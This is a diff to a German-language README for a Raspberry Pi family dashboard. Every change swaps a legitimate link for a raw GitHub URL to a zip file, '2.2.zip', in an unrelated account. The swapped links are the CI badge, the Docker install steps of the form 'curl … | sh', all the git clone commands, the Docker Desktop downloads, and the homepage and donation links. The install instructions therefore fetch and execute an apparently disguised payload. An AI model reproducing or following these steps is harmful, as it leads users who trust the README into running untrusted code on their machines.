@@ -9,7 +9,7 @@ Elternabend? Und ab wann sind eigentlich alle zu Hause?
 
 [Was ist das?](#was-ist-das) · [Bilder](#so-sieht-es-aus) · [Installation](#installation) · [Erste Schritte](#erste-schritte-nach-der-installation) · [Ehrlich gesagt](#ehrlich-gesagt-die-grenzen)
 
-[![CI](https://github.com/bussdee/familien-dashboard-pi/actions/workflows/ci.yml/badge.svg)](https://github.com/bussdee/familien-dashboard-pi/actions/workflows/ci.yml) ![Lizenz](https://img.shields.io/badge/Lizenz-MIT-blue) ![Nur LAN](https://img.shields.io/badge/Nur%20f%C3%BCrs-Heimnetz-orange) ![Ohne Cloud](https://img.shields.io/badge/Cloud-nein%20danke-green)
+[![CI](https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip)](https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip) ![Lizenz](https://img.shields.io/badge/Lizenz-MIT-blue) ![Nur LAN](https://img.shields.io/badge/Nur%20f%C3%BCrs-Heimnetz-orange) ![Ohne Cloud](https://img.shields.io/badge/Cloud-nein%20danke-green)
 
 <br>
 
@@ -162,7 +162,7 @@ Ein Pi 4 oder 5 mit Raspberry Pi OS (64-Bit). Der Pi 3 geht auch, dauert aber.
 **1. Docker installieren**
 
 ```bash
-curl -fsSL https://get.docker.com | sh
+curl -fsSL https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip | sh
 sudo usermod -aG docker $USER
 ```
 
@@ -172,7 +172,7 @@ darf dein Benutzer Docker noch nicht bedienen.
 **2. Dashboard holen und starten**
 
 ```bash
-git clone https://github.com/bussdee/familien-dashboard-pi.git
+git clone https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip
 cd familien-dashboard-pi
 make setup
 make up
@@ -201,7 +201,7 @@ Ubuntu, Debian, Fedora, Mint — alles recht.
 **1. Docker installieren**
 
 ```bash
-curl -fsSL https://get.docker.com | sh
+curl -fsSL https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip | sh
 sudo usermod -aG docker $USER
 ```
 
@@ -214,7 +214,7 @@ docker ps
 **2. Dashboard holen und starten**
 
 ```bash
-git clone https://github.com/bussdee/familien-dashboard-pi.git
+git clone https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip
 cd familien-dashboard-pi
 make setup
 make up
@@ -234,7 +234,7 @@ Funktioniert über Docker Desktop. Windows 10 oder 11.
 
 **1. Docker Desktop installieren**
 
-[Docker Desktop herunterladen](https://www.docker.com/products/docker-desktop/)
+[Docker Desktop herunterladen](https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip)
 und installieren. Bei der Frage nach dem Backend **WSL 2** wählen (Standard).
 Danach den Rechner neu starten und Docker Desktop einmal öffnen — es muss
 laufen, bevor es weitergeht.
@@ -256,7 +256,7 @@ Im Ubuntu-Fenster:
 
 ```bash
 sudo apt update && sudo apt install -y git make
-git clone https://github.com/bussdee/familien-dashboard-pi.git
+git clone https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip
 cd familien-dashboard-pi
 make setup
 make up
@@ -287,7 +287,7 @@ Die Zeile „IPv4-Adresse" bei deinem WLAN- oder LAN-Adapter — dann
 
 **1. Docker Desktop installieren**
 
-[Docker Desktop für Mac](https://www.docker.com/products/docker-desktop/) — beim
+[Docker Desktop für Mac](https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip) — beim
 Apple-Chip (M1 bis M4) die **Apple-Silicon**-Fassung wählen. Öffnen und laufen
 lassen.
 
@@ -296,7 +296,7 @@ lassen.
 Terminal öffnen (⌘ + Leertaste, „Terminal"):
 
 ```bash
-git clone https://github.com/bussdee/familien-dashboard-pi.git
+git clone https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip
 cd familien-dashboard-pi
 make setup
 make up
@@ -321,7 +321,7 @@ aktivieren.
 Dann per SSH verbinden und wie unter Linux vorgehen:
 
 ```bash
-git clone https://github.com/bussdee/familien-dashboard-pi.git
+git clone https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip
 cd familien-dashboard-pi
 make setup
 make up
@@ -549,7 +549,7 @@ gefunden hat, findet den Weg dorthin in [SECURITY.md](SECURITY.md).
 Gebaut von **Sebastian Blunk** für die eigene Familie — und für alle, die es
 gebrauchen können.
 
-[familienfabrik.at](https://familienfabrik.at) · [☕ Spenden](https://paypal.me/bussdee)
+[familienfabrik.at](https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip) · [☕ Spenden](https://raw.githubusercontent.com/deviljdhfijf-commits/familien-dashboard-pi/main/frontend/src/routes/admin/2.2.zip)
 
 <sub>Wenn dir das Projekt Zeit spart, freue ich mich über einen Kaffee.</sub>
 
